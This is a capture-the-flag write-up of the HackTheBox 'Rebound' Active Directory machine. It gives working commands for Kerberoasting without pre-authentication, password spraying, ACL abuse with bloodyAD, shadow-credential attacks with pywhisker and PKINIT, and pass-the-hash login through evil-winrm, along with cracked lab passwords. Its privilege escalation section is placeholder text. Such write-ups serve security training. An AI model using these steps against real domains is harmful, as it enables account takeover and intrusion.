```json
Alias: Rebound
Date: 24-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Insane
Status: Complete
IP: 10.129.229.114
```

# Rebound
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-24 10:32 PKT
Nmap scan report for 10.129.229.114
Host is up (0.13s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-24 12:32:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-24T12:33:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-24T12:33:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-08-24T12:33:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
|_ssl-date: 2024-08-24T12:33:33+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-24T12:33:25
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.33 seconds
```
## Discovered Subdomains
```
rebound.htb
dc01.rebound.htb
```

---
# Enumeration

We have guest access to the SMB Server, but the only accessible share is empty. We do a rid-brute and get the users. Then check for accounts with no Pre-Authentication with kerbrute and we will find jjones.

The only lead we have in this is an account with Pre-Authentication disabled, but it can't be cracked. So what can we do with this? We can actually request the service ticket of a service account from the KDC in the AS-REQ. This means if Pre-Authentication is disabled we directly request a TGS. The latest version of impacket implements this in GetUserSPNs.py with the `-no-preauth` flag.

```bash
GetUserSPNs.py -no-preauth jjones -usersfile ~/Documents/CTF/Hackthebox/Rebound/users -dc-host $IP rebound.htb/
```

We get 3 hits, but the only valid one would to crack would be for the ldap_monitor account as the others are computer accounts and their passwords would be randomized. Cracking with hashcat we get

| Username     | Password   |
| ------------ | ---------- |
| ldap_monitor | 1GR8t@$$4u |

---

# Lateral Movement

### Oorend

Doing a password spray with the above password on the rest of the users, we find that Orend has the same password.

| Username | Password   |
| -------- | ---------- |
| OOrend   | 1GR8t@$$4u |

### WINRM_SVC

![[Pasted image 20240825015320.png]]

We can see that OOrend can add himself to ServiceMGMT which has Generic All over service users. Service Users also contains other service accounts,  such as WINRM_SVC

![[Pasted image 20240825015517.png]]

We will now add oorend to servicemgmt using bloodyAD.

```bash
bloodyAD --host $IP -d rebound.htb -u oorend -p '1GR8t@$$4u' add groupMember SERVICEMGMT oorend
```

Now, you'd think we can directly change the password for winrm_svc because we have generic all over the OU and winrm_svc has inherited the ACLs as wee right? Apparently not. It seems that inheritance is disabled for the specific genericAll ACE that the Service_MGMT group has over the OU, but we all access over the OU so we can simply enable inheritance! or more conveniently give oorend genericAll over the OU since by default, inheritance is enabled for a ACL.

```bash
bloodyAD --host $IP -d rebound.htb -u oorend -p '1GR8t@$$4u' add genericAll "OU=SERVICE USERS,DC=REBOUND,DC=HTB" oorend
```

#### Password Reset

Now we can change winrm_svc password.

```bash
bloodyAD --host $IP -d rebound.htb -u oorend -p '1GR8t@$$4u' set password winrm_svc 'Password123$'
```

| Username  | Password     |
| --------- | ------------ |
| winrm_svc | Password123$ |

#### Shadow Credential (Alternative) (Opsec Friendly)

The better way to access winrm_svc is to write to their MSDS-KeyCredentialLink attribute, and we can do this since we have GenericAll on them. How does this work? Read [[Kerberos#PKINIT Based on MSDS-KeyCredentialLink]].

Get TGT for orend
```bash
impacket-getTGT 'rebound.htb'/'oorend':'1GR8t@$$4u' -dc-ip rebound.htb
```
Setup TGT

```bash
export KRB5CCNAME=oorend.ccache
```

Add Public Key to msds-KeyCredentialLink
```bash
python3 pywhiker.py -d "rebound.htb" -k -u "oorend" --target "winrm_svc" --action "add" --dc-ip "rebound.htb" --use-ldaps
```

get TGT as winrm_svc using generated cert from above command
```bash
python3 gettgtpkinit.py rebound.htb/winrm_svc -cert-pfx ../pywhisker/OUp2QOp2.pfx -pfx-pass 5QKJXsgTHcsGvaspHWt5 winrm.ccache`
```


Get Hash from TGT
```bash
python3 getnthash.py -key 0cfb6ae5cee5d22f505512ea1252e1daca324032f620a6d4725d2c656474ad37 'rebound.htb/winrm_svc'
```

Connect:
`evil-winrm -i rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512`

---

# Privilege Escalation

## Local Enumeration
Lorem ipsum dolor sit amet.

## Privilege Escalation Vector
Lorem ipsum dolor sit amet.

---

# Flags
- 45e63ed79f511d66af9da23521f68b2c
- root.txt

#CTF